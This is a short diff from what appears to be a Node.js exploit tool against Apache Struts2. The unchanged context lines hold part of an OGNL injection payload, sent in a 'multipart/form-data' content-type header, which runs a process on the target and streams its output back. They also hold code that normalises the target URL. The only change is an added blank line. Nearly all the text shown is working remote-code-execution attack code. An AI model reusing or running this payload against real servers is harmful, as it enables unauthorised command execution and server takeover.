@@ -80,6 +80,7 @@ var a = process.argv.splice(2),g_postData = "%{(#nike='multipart/form-data')"
 		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
 		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
 		+ ".(#ros.flush()).(#ros.close())}";
+
 g_szUrl = program.url || 1 == a.length && a[0] || "";
 if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
 	g_szUrl += "/";
